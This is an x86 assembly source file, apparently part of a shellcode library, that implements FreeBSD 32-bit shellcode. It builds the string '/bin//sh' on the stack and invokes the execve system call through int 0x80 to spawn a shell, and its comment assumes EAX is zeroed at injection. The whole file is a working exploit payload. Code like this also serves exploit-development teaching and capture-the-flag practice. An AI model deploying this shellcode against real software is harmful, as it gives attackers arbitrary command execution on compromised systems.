        ;; EAX must be cleared upon entry
[BITS 32]
        %include "freebsd/32.asm"

        ;; Push '/bin//sh'
        push eax
        push `//sh`
        push `/bin`
        mov ebx, esp
        push eax
        push ebx
        mov ecx, esp

        ;; Call execve
        push eax
        push ecx
        push ebx
        mov al, SYS_execve
        push eax                ; Unused
        int 0x80
